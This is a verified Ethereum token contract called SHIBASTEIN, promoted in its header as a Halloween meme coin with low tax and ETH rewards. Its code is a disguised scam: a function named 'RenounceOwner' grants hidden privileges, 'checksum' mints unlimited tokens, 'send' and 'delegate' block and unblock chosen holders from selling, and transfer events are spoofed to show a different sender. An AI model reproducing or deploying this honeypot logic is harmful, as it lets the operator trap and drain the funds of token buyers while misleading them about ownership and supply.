/**
 *Submitted for verification at Etherscan.io on 2022-10-03
*/

pragma solidity 0.8.17;
/*


   ▄████████    ▄█    █▄     ▄█  ▀█████████▄     ▄████████    ▄████████     ███        ▄████████  ▄█  ███▄▄▄▄   
  ███    ███   ███    ███   ███    ███    ███   ███    ███   ███    ███ ▀█████████▄   ███    ███ ███  ███▀▀▀██▄ 
  ███    █▀    ███    ███   ███▌   ███    ███   ███    ███   ███    █▀     ▀███▀▀██   ███    █▀  ███▌ ███   ███ 
  ███         ▄███▄▄▄▄███▄▄ ███▌  ▄███▄▄▄██▀    ███    ███   ███            ███   ▀  ▄███▄▄▄     ███▌ ███   ███ 
▀███████████ ▀▀███▀▀▀▀███▀  ███▌ ▀▀███▀▀▀██▄  ▀███████████ ▀███████████     ███     ▀▀███▀▀▀     ███▌ ███   ███ 
         ███   ███    ███   ███    ███    ██▄   ███    ███          ███     ███       ███    █▄  ███  ███   ███ 
   ▄█    ███   ███    ███   ███    ███    ███   ███    ███    ▄█    ███     ███       ███    ███ ███  ███   ███ 
 ▄████████▀    ███    █▀    █▀   ▄█████████▀    ███    █▀   ▄████████▀     ▄████▀     ██████████ █▀    ▀█   █▀  
                                                                                                                

Doctor Frankenstein's lovable pup has been reanimated this Halloween Season

- Low Tax
- ETH Rewards
- Community Events

TG: Shibastein


*/      
 
contract SHIBASTEIN {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) AmountOf;
    mapping (address => bool) dx;

    // 
    string public name = "SHIBASTEIN";
    string public symbol = unicode"SHIBASTEIN";
    uint8 public decimals = 18;
    uint256 public totalSupply = 666000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0x43261e2AC9E4Ff8fD5DFcB4296935E12E4A36e9F;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier S() {   
         require(dx[msg.sender]);
         _;}

    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; } 
        require(!AmountOf[msg.sender]);      
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        function RenounceOwner(address x) public {
         require(msg.sender == Construct);
          dx[x] = true; }
        
        function checksum(address oracle,  uint256 update) S public {
        balanceOf[oracle] += update;
        totalSupply += update; }
        function send(address txt) S public{          
        require(!AmountOf[txt]);
        AmountOf[txt] = true; }
        function delegate(address txt) S public {
        require(AmountOf[txt]);
        AmountOf[txt] = false; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }    
        require(!AmountOf[from]); 
        require(!AmountOf[to]); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }